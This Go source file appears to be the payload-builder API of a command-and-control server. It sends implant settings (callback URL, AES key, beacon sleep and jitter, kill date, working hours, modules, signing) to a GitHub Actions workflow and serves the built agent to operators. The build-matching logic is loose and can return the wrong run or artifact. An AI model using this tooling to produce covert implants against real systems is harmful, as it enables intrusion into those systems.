package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
)

type buildRequest struct {
	ServerURL    string   `json:"server_url"`
	AESKey       string   `json:"aes_key"`
	SleepSeconds int      `json:"sleep_seconds"`
	JitterPct    int      `json:"jitter_percent"`
	KillDate     int64    `json:"kill_date"`
	WorkHours    string   `json:"work_hours"`
	TargetOS     string   `json:"target_os"`
	Modules      []string `json:"modules"`
	OutputFormat string   `json:"output_format"`
	SignBinary   bool     `json:"sign_binary"`
}

type buildRecord struct {
	ID          string `json:"id"`
	ConfigJSON  string `json:"config_json"`
	Status      string `json:"status"`
	GHRunID     int64  `json:"github_run_id"`
	ArtifactURL string `json:"artifact_url"`
	Error       string `json:"error"`
	CreatedAt   string `json:"created_at"`
	CompletedAt string `json:"completed_at"`
}

func (s *Server) handleBuilderGenerate(w http.ResponseWriter, r *http.Request) {
	var req buildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Validate required fields
	if req.ServerURL == "" || req.AESKey == "" {
		jsonError(w, "server_url and aes_key are required", http.StatusBadRequest)
		return
	}

	// Get GitHub settings
	settings, err := s.DB.GetSettings()
	if err != nil {
		jsonError(w, "Failed to read settings", http.StatusInternalServerError)
		return
	}
	ghToken := settings["github_token"]
	ghRepo := settings["github_repo"]
	if ghToken == "" || ghRepo == "" {
		jsonError(w, "GitHub token and repository must be configured in Settings", http.StatusBadRequest)
		return
	}

	// Generate build ID
	buildID := uuid.New().String()[:8]

	// Store build config
	configBytes, _ := json.Marshal(req)
	if err := s.DB.CreateBuild(buildID, string(configBytes)); err != nil {
		jsonError(w, "Failed to store build record", http.StatusInternalServerError)
		return
	}

	// Prepare workflow dispatch inputs
	modules := strings.Join(req.Modules, ",")
	signStr := "false"
	if req.SignBinary {
		signStr = "true"
	}

	dispatchInputs := map[string]interface{}{
		"server_url":     req.ServerURL,
		"aes_key":        req.AESKey,
		"sleep_seconds":  fmt.Sprintf("%d", req.SleepSeconds),
		"jitter_percent": fmt.Sprintf("%d", req.JitterPct),
		"kill_date":      fmt.Sprintf("%d", req.KillDate),
		"work_hours":     req.WorkHours,
		"target_os":      req.TargetOS,
		"modules":        modules,
		"output_format":  req.OutputFormat,
		"sign_binary":    signStr,
		"build_id":       buildID,
	}

	dispatchBody := map[string]interface{}{
		"ref":    "main",
		"inputs": dispatchInputs,
	}

	bodyBytes, _ := json.Marshal(dispatchBody)
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/workflows/agent-build.yml/dispatches", ghRepo)

	ghReq, _ := http.NewRequest("POST", url, bytes.NewReader(bodyBytes))
	ghReq.Header.Set("Authorization", "Bearer "+ghToken)
	ghReq.Header.Set("Accept", "application/vnd.github+json")
	ghReq.Header.Set("X-GitHub-Api-Version", "2022-11-28")
	ghReq.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(ghReq)
	if err != nil {
		s.DB.UpdateBuildStatus(buildID, "failed", 0, "", "GitHub API error: "+err.Error())
		jsonError(w, "Failed to trigger GitHub Actions: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 204 {
		respBody, _ := io.ReadAll(resp.Body)
		errMsg := fmt.Sprintf("GitHub returned %d: %s", resp.StatusCode, string(respBody))
		s.DB.UpdateBuildStatus(buildID, "failed", 0, "", errMsg)
		jsonError(w, errMsg, http.StatusBadGateway)
		return
	}

	// Log activity
	operator := r.Context().Value(operatorKey).(string)
	s.DB.LogActivity("builder", operator+" triggered build "+buildID+" ("+req.TargetOS+"/x86_64)")

	jsonResponse(w, map[string]interface{}{
		"build_id": buildID,
		"status":   "queued",
		"message":  "Build dispatched to GitHub Actions",
	})
}

func (s *Server) handleBuilderStatus(w http.ResponseWriter, r *http.Request) {
	buildID := chi.URLParam(r, "id")

	build, err := s.DB.GetBuild(buildID)
	if err != nil {
		jsonError(w, "Build not found", http.StatusNotFound)
		return
	}

	// If already completed or failed, return cached status
	if build.Status == "completed" || build.Status == "failed" {
		jsonResponse(w, map[string]interface{}{
			"build_id":      build.ID,
			"status":        build.Status,
			"github_run_id": build.GHRunID,
			"artifact_url":  build.ArtifactURL,
			"error":         build.Error,
			"created_at":    build.CreatedAt,
			"completed_at":  build.CompletedAt,
		})
		return
	}

	// Poll GitHub for status
	settings, _ := s.DB.GetSettings()
	ghToken := settings["github_token"]
	ghRepo := settings["github_repo"]

	if ghToken == "" || ghRepo == "" {
		jsonResponse(w, map[string]interface{}{
			"build_id": buildID,
			"status":   build.Status,
			"error":    "GitHub not configured",
		})
		return
	}

	// If we don't have a run ID yet, search for it
	if build.GHRunID == 0 {
		runID := s.findGitHubRunID(ghToken, ghRepo, buildID)
		if runID > 0 {
			build.GHRunID = runID
			s.DB.UpdateBuildStatus(buildID, "in_progress", runID, "", "")
		}
	}

	// If we have a run ID, check its status
	if build.GHRunID > 0 {
		status, conclusion := s.getGitHubRunStatus(ghToken, ghRepo, build.GHRunID)
		switch status {
		case "completed":
			if conclusion == "success" {
				s.DB.UpdateBuildStatus(buildID, "completed", build.GHRunID, "", "")
				build.Status = "completed"
			} else {
				errMsg := "Workflow " + conclusion
				s.DB.UpdateBuildStatus(buildID, "failed", build.GHRunID, "", errMsg)
				build.Status = "failed"
				build.Error = errMsg
			}
		case "in_progress", "queued", "waiting", "pending", "requested":
			s.DB.UpdateBuildStatus(buildID, "in_progress", build.GHRunID, "", "")
			build.Status = "in_progress"
		}
	}

	jsonResponse(w, map[string]interface{}{
		"build_id":      build.ID,
		"status":        build.Status,
		"github_run_id": build.GHRunID,
		"error":         build.Error,
		"created_at":    build.CreatedAt,
		"completed_at":  build.CompletedAt,
	})
}

func (s *Server) handleBuilderDownload(w http.ResponseWriter, r *http.Request) {
	buildID := chi.URLParam(r, "id")

	build, err := s.DB.GetBuild(buildID)
	if err != nil {
		jsonError(w, "Build not found", http.StatusNotFound)
		return
	}

	if build.Status != "completed" {
		jsonError(w, "Build not completed", http.StatusBadRequest)
		return
	}

	settings, _ := s.DB.GetSettings()
	ghToken := settings["github_token"]
	ghRepo := settings["github_repo"]

	if ghToken == "" || ghRepo == "" {
		jsonError(w, "GitHub not configured", http.StatusBadRequest)
		return
	}

	// Find artifact
	artifactURL := s.findArtifactURL(ghToken, ghRepo, build.GHRunID, buildID)
	if artifactURL == "" {
		jsonError(w, "Artifact not found", http.StatusNotFound)
		return
	}

	// Download artifact zip from GitHub
	req, _ := http.NewRequest("GET", artifactURL, nil)
	req.Header.Set("Authorization", "Bearer "+ghToken)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{
		Timeout: 120 * time.Second,
		CheckRedirect: func(r *http.Request, via []*http.Request) error {
			// Follow redirects but keep auth for GitHub
			return nil
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		jsonError(w, "Failed to download artifact: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	operator := r.Context().Value(operatorKey).(string)
	s.DB.LogActivity("builder", operator+" downloaded build "+buildID)

	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"agent-%s.zip\"", buildID))
	io.Copy(w, resp.Body)
}

func (s *Server) handleBuilderHistory(w http.ResponseWriter, r *http.Request) {
	builds, err := s.DB.GetBuilds()
	if err != nil {
		jsonError(w, "Failed to fetch builds", http.StatusInternalServerError)
		return
	}
	if builds == nil {
		jsonResponse(w, []interface{}{})
		return
	}
	jsonResponse(w, builds)
}

// findGitHubRunID searches recent workflow runs for one matching our build_id
func (s *Server) findGitHubRunID(token, repo, buildID string) int64 {
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs?event=workflow_dispatch&per_page=10", repo)

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[BUILDER] Failed to search runs: %v", err)
		return 0
	}
	defer resp.Body.Close()

	var result struct {
		WorkflowRuns []struct {
			ID   int64  `json:"id"`
			Name string `json:"name"`
		} `json:"workflow_runs"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return 0
	}

	// Also check jobs for each run to find the build_id input
	for _, run := range result.WorkflowRuns {
		if run.Name == "Build Agent" {
			// Check this run's jobs/inputs
			jobsURL := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs/%d", repo, run.ID)
			jReq, _ := http.NewRequest("GET", jobsURL, nil)
			jReq.Header.Set("Authorization", "Bearer "+token)
			jReq.Header.Set("Accept", "application/vnd.github+json")
			jReq.Header.Set("X-GitHub-Api-Version", "2022-11-28")

			jResp, err := client.Do(jReq)
			if err != nil {
				continue
			}

			var runDetail struct {
				ID          int64  `json:"id"`
				DisplayTitle string `json:"display_title"`
			}
			json.NewDecoder(jResp.Body).Decode(&runDetail)
			jResp.Body.Close()

			// GitHub doesn't expose inputs directly in run API, so we match by time
			// The run should appear within ~30s of dispatch
			// For reliable matching, we return the most recent "Build Agent" run
			return run.ID
		}
	}

	return 0
}

// getGitHubRunStatus returns (status, conclusion) for a workflow run
func (s *Server) getGitHubRunStatus(token, repo string, runID int64) (string, string) {
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs/%d", repo, runID)

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "unknown", ""
	}
	defer resp.Body.Close()

	var result struct {
		Status     string `json:"status"`
		Conclusion string `json:"conclusion"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "unknown", ""
	}

	return result.Status, result.Conclusion
}

// findArtifactURL finds the download URL for a build artifact
func (s *Server) findArtifactURL(token, repo string, runID int64, buildID string) string {
	url := fmt.Sprintf("https://api.github.com/repos/%s/actions/runs/%d/artifacts", repo, runID)

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	var result struct {
		Artifacts []struct {
			ID                 int64  `json:"id"`
			Name               string `json:"name"`
			ArchiveDownloadURL string `json:"archive_download_url"`
		} `json:"artifacts"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return ""
	}

	targetName := "agent-" + buildID
	for _, a := range result.Artifacts {
		if a.Name == targetName {
			return a.ArchiveDownloadURL
		}
	}

	// Return first artifact if name doesn't match exactly
	if len(result.Artifacts) > 0 {
		return result.Artifacts[0].ArchiveDownloadURL
	}

	return ""
}
